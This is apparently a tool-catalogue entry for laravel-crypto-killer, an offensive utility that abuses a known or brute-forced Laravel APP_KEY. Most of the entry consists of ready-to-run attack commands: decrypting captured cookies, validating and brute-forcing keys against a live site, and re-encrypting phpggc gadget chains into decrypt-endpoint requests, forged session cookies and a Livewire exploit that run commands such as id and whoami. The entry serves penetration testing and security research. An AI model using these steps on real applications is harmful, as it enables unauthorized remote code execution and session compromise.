---
name: "laravel-crypto-killer"
categories:
  - webapp
homepage: "https://github.com/synacktiv/laravel-crypto-killer"
origin: "hacktricks"
recipe: "upstream"
packaged-by: []
build-system: python
license: MIT
meta-checked: "2026-11-13"
github-repo: "synacktiv/laravel-crypto-killer"
github-match: "exact"
github-stars: 147
gh-checked: "2026-11-13"
worth: 5.3
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-13"
---

# laravel-crypto-killer

> Exploits Laravel's `decrypt()`/`encrypt()` once you hold the `APP_KEY`: forge serialized payloads for RCE, decrypt cookies, or brute-force reused keys.

## What it's for

laravel-crypto-killer (Synacktiv, remsio & Kainx42) attacks the crypto
layer of Laravel applications. Laravel's `Illuminate\Encryption`
decrypts and then `unserialize()`s data using the secret `APP_KEY` — so
anyone who can submit ciphertext to a `decrypt()` endpoint (or a
cookie-session app) AND knows the `APP_KEY` gets PHP object injection,
and Laravel's policy is not to patch gadget chains: with a phpggc chain
this is remote command execution. The tool encrypts (forged payloads
formatted for values or session cookies), decrypts (captured cookies and
ciphertexts), checks a candidate key against a live URL, and brute-forces
`APP_KEY` values from wordlists — useful when a public project's key was
reused. Without a valid `APP_KEY` (or a guessable one) the crypto attacks
do nothing; it is not a CVE scanner.

*No corpus evidence — derived from upstream documentation.

## Typical use cases

### Decrypt a captured value with a known APP_KEY

Recover plaintext from any `encrypt()`/`encryptString()` output.

```
./laravel_crypto_killer.py decrypt -k CGhMqYXFMzbOe048WS6a0iG8f6bBcTLVbP36bqqrvuA= -v eyJpdi...IiJ9
```

Outcome: prints the unciphered value and its base64 form; if the
plaintext contains PHP-serialized data it flags
`Matched serialized data ... time to exploit unserialization` — the
signal that a phpggc payload re-encrypted under this key will be
unserialized server-side.

### Check an APP_KEY against a live application

Validate a leaked or guessed key without touching endpoints manually.

```
./laravel_crypto_killer.py check https://target.example.com ko0ziOprodjT9TOcW3/CP2vyA3pjaRzz0ANa1uiCPU0=
```

Outcome: attempts to decrypt the app's `XSRF-TOKEN` and `laravel_session`
cookies with the given key and lists which decrypted — cookie decryption
is proof the key is the live `APP_KEY`.

### Brute-force a reused APP_KEY

Try known keys from wordlists.

```
./laravel_crypto_killer.py bruteforce
```

Outcome: loads every wordlist in the bundled `wordlists/` folder (public
project keys) and tests them against the target's cookie ciphertexts —
hits mean key reuse and full exploitability.

### Forge a payload for RCE via a decrypt endpoint

Chain phpggc into command execution.

```
php7.4 phpggc Laravel/RCE9 system id -b
./laravel_crypto_killer.py encrypt -k CGhMqYXFMzbOe048WS6a0iG8f6bBcTLVbP36bqqrvuA= -v <phpggc-base64-payload>
curl -s http://target.example.com/decrypt/<ciphered-value>
```

Outcome: generates a Laravel gadget chain with phpggc (match the target's
PHP version), re-encrypts it under the `APP_KEY`, and the server's
`decrypt()` unserializes it on request — the response carries the
command output (`uid=1337(...)`).

### Exploit a cookie-based session

RCE when `SESSION_DRIVER=cookie`.

```
./laravel_crypto_killer.py encrypt -k base64:Bqm5/FxXT5IT0Jx7vbhVvSiMKXTI2JMOCD9XKzHiHJw= -v <phpggc-payload> -sc 57b910d166b2a034c861d4e61c4d8e584bbf9d19
```

Outcome: formats the ciphered payload as a session cookie (the `-sc`
hash must be the value before the `|` in the decrypted session cookie) —
send it in the cookie the `laravel_session` cookie references to trigger
unserialization on the next request.

### Run an automated exploit (Livewire)

Use the built-in exploit module.

```
python3 laravel_crypto_killer.py exploit -e livewire -k 'base64:CGhMqYXFMzbOe048WS6a0iG8f6bBcTLVbP36bqqrvuA=' -j request.json --function system -p whoami
```

Outcome: replays the captured request JSON (`-j`) against the Livewire
endpoint with the payload encrypted under the key, executing `--function
system -p whoami` and printing the application's response.
